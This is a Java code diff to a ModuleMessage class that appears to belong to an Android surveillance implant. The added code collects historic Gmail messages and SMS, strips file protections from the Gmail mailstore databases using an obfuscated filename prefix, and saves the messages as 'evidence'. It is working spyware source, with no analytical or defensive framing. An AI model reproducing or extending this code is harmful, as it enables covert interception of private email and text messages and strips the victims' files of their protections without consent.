@@ -268,23 +268,31 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 	@Override
 	public void actualGo() {
-		/*
-		 * if (mailEnabled) { try { readHistoricMail(lastMail); } catch
-		 * (IOException e) { if (Cfg.DEBUG) { Check.log(TAG +
-		 * " (initMail) Error: " + e); } } }
-		 */
+
+		if (mailEnabled) {
+			try {
+				readHistoricMail(lastMail);
+			} catch (IOException e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (initMail) Error: " + e);
+				}
+			}
+		}
+		
+		if(smsEnabled){
+			int mylastSMS = readHistoricSms(lastSMS);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (initSms): next lastSMS: " + mylastSMS);
+			}
+			updateMarkupSMS(mylastSMS);
+
+		}
+
 	}
 
 	private void initMail() {
 		lastMail = storedMAIL.unserialize(new Hashtable<String, Integer>());
 
-		try {
-			readHistoricMail(lastMail);
-		} catch (IOException e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (initMail) Error: " + e);
-			}
-		}
 	}
 
 	private void initSms() {
@@ -302,12 +310,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 			}
 		}
 
-		int mylastSMS = readHistoricSms(lastSMS);
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (initSms): next lastSMS: " + mylastSMS);
-		}
-		updateMarkupSMS(mylastSMS);
-
+		
 		/*
 		 * if (!storedSMS.isMarkup()) { int lastSMS = readHistoricSms();
 		 * storedSMS.createEmptyMarkup(); }
@@ -377,21 +380,33 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 	Semaphore stillReadingEmail = new Semaphore(1);
 
 	private String[] getMailStores(String databasePath) {
-		File file = new File(databasePath);
-		File parent = new File(file.getParent());
+		File dir = new File(databasePath);
+		File parent = new File(dir.getParent());
 
 		Path.unprotect(parent.getParent());
 		Path.unprotect(parent.getAbsolutePath());
-		Path.unprotect(file.getAbsolutePath());
-
-		FilenameFilter filter = new FilenameFilter() {
+		Path.unprotect(dir.getAbsolutePath());
+		
+		FilenameFilter filterdb = new FilenameFilter() {
 			public boolean accept(File directory, String fileName) {
 				// i_3=mailstore.
 				return fileName.endsWith(".db") && fileName.startsWith(Messages.getString("i_3"));
 			}
 		};
+		
+		FilenameFilter filterall = new FilenameFilter() {
+			public boolean accept(File directory, String fileName) {
+				// i_3=mailstore.
+				return fileName.startsWith(Messages.getString("i_3"));
+			}
+		};
+		
+		for(String file : dir.list(filterall)){
+			Path.unprotect(dir + "/" + file, true);
+		}
 
-		String[] mailstores = file.list(filter);
+
+		String[] mailstores = dir.list(filterdb);
 		return mailstores;
 	}
 
@@ -411,7 +426,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 					AutoFile file = new AutoFile(mailstore);
 
-					GmailVisitor visitor = new GmailVisitor(this, mailstore);
+					GmailVisitor visitor = new GmailVisitor(this, mailstore, filterCollect[ID_MAIL]);
 					GenericSqliteHelper helper = GenericSqliteHelper.open(databasePath, mailstore);
 
 					int lastId = lastMail.containsKey(mailstore) ? lastMail.get(mailstore) : 0;
@@ -430,6 +445,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 				}
 			} catch (Exception ex) {
 				if (Cfg.DEBUG) {
+					ex.printStackTrace();
 					Check.log(TAG + " (readHistoricMail) Error: " + ex);
 				}
 			} finally {
@@ -527,7 +543,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 
 		int maxMessageSize = 50 * 1024;
 		final String mail = message.makeMimeMessage(maxMessageSize);
-		
+
 		if (filterCollect[ID_MAIL].filterMessage(message.getDate(), mail.length(), 0) == Filter.FILTERED_OK) {
 
 			saveEvidenceEmail(message, mail);
